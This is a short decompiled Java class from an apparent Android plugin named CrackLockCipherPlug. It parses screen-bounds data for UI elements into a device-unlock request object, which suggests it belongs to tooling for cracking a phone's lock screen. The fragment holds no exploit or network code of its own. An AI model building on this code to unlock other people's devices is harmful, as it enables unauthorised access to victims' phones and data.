package com.guard.wallet.plug;

import a1.q;
import com.google.json.Gson;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import java.lang.reflect.Type;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Predicate;

public final class a implements Predicate {
   public final ReqUnlockDeviceVO a;

   public a(ReqUnlockDeviceVO var1) {
      this.a = var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final boolean test(Object var1) {
      Exception var10000;
      ListenPropResponse var3 = (ListenPropResponse)var1;
      boolean var2 = Objects.equals(var3.getProp(), "boundsInScreen");
      var1 = this.a;
      label52:
      if (var2) {
         try {
            if (q.B(var3.getValue())) {
               return true;
            }

            CrackLockCipherPlug$CrackRunnable$1$1 var4 = new CrackLockCipherPlug$CrackRunnable$1$1();
            Type var5 = var4.getType();
            Gson var16 = new Gson();
            var13 = var16.fromJson(var3.getValue(), var5);
         } catch (Exception var7) {
            var10000 = var7;
            boolean var10001 = false;
            break label52;
         }

         if (var13 == null) {
            return true;
         }

         try {
            var1.setBoundsInScreen(var13);
            return true;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var20 = false;
         }
      } else {
         label57: {
            if (!Objects.equals(var3.getProp(), "boundsInParent")) {
               return false;
            }

            try {
               if (q.B(var3.getValue())) {
                  return true;
               }

               CrackLockCipherPlug$CrackRunnable$1$2 var17 = new CrackLockCipherPlug$CrackRunnable$1$2();
               Type var19 = var17.getType();
               Gson var18 = new Gson();
               var14 = var18.fromJson(var3.getValue(), var19);
            } catch (Exception var9) {
               var10000 = var9;
               boolean var21 = false;
               break label57;
            }

            if (var14 == null) {
               return true;
            }

            try {
               var1.setBoundsInParent(var14);
               return true;
            } catch (Exception var8) {
               var10000 = var8;
               boolean var22 = false;
            }
         }
      }

      Exception var11 = var10000;
      ConcurrentLinkedQueue var15 = c.a;
      q.s("com.guard.wallet.plug.c", var11);
      return true;
   }
}
